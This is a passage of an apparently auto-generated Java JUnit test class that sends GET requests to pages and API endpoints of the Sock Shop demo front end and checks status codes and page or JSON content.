        request.setHeaders(new Hashtable<String, Object>() {{
            put("postman-token", postman_token);
        }});
        final Response response = frontEndSockShop.get(request, "/customer-order.html");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#customer-order div.box h2", "Order #", response.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/61/dataset_61.json")
    public void testGetCustomerOrdersHtml061(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");
        final String postman_token = json.getString("postman_token");

        // GET http://front-end.sock-shop/customer-orders.html (endp 61)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform);
            put("postman-token", postman_token);
        }});
        final Response response = frontEndSockShop.get(request, "/customer-orders.html");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#customer-orders div.box h1", "My orders", response.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/224/dataset_224.json")
    public void testGetCustomers224(final JsonObject json) throws MalformedURLException, IOException
    {
        final String postman_token = json.getString("postman_token");

        // GET http://front-end.sock-shop/customers (endp 224)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("postman-token", postman_token);
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/customers");
        assertStatusCode(response.code(), 200);
        assertJSONPath("$._embedded.customer[*]._links.self.href", response.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/13/dataset_13.json")
    public void testGetDetailHtml013(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");
        final String amp_cache_transform1 = json.getString("amp_cache_transform1");
        final String postman_token = json.getString("postman_token");
        final String size = json.getString("size");
        final String tags = json.getString("tags");

        // GET http://front-end.sock-shop/catalogue (endp 11)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setQueryString(new Hashtable<String, Object>() {{
            put("page", "1");
            put("size", size);
            put("sort", "id");
            put("tags", tags);
        }});
        request.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform);
            put("postman-token", postman_token);
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/catalogue");
        assertStatusCode(response.code(), 200);
        assertJSONPath("$[*].tag[*]", response.body().string());
        final String id = JSONPath("$[*].id", response.body().string());

        // GET http://front-end.sock-shop/detail.html (endp 13)
        final HttpRequest request2 = new HttpRequest();
        request2.setQueryString(new Hashtable<String, Object>() {{
            put("id", id);
        }});
        request2.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform1);
        }});
        final Response response2 = frontEndSockShop.get(request2, "/detail.html");
        assertStatusCode(response2.code(), 200);
        assertCSSselect("div#content div.container div div.row.same-height-row div div.box.same-height h3", "You may also like these products", response2.body().string());
    }

    @Test
    public void testGetFooterHtml039() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/footer.html (endp 39)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/footer.html");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#copyright div.container div p.pull-left a", "Weaveworks", response.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/64/dataset_64.json")
    public void testGetIndexHtml064(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");
        final String findcli = json.getString("findcli");
        final String postman_token = json.getString("postman_token");

        // GET http://front-end.sock-shop/index.html (endp 64)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setQueryString(new Hashtable<String, Object>() {{
            put("findcli", findcli);
        }});
        request.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform);
            put("postman-token", postman_token);
        }});
        final Response response = frontEndSockShop.get(request, "/index.html");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGetIpinfoIo240() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ipinfo.io (endp 240)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        final Response response = frontEndSockShop.get(request, "/ipinfo.io");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGetTags041() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/tags (endp 41)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/tags");
        assertStatusCode(response.code(), 200);
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/71/dataset_71.json")
    public void testGetTags071(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");
        final String postman_token = json.getString("postman_token");

        // GET http://front-end.sock-shop/tags (endp 71)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform);
            put("postman-token", postman_token);
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/tags");
        assertStatusCode(response.code(), 200);
        assertJSONPath("$.tags[*]", response.body().string());
    }

    @Test
    public void testGetTopbarHtml042() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/topbar.html (endp 42)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/topbar.html");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#top div.container div.offer a.btn.btn-success", "Offer of the day", response.body().string());
    }

    @Test
    public void testGetWww99synComIndexHtml243() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/www.99syn.com/index.html (endp 243)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        final Response response = frontEndSockShop.get(request, "/www.99syn.com/index.html");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }
}

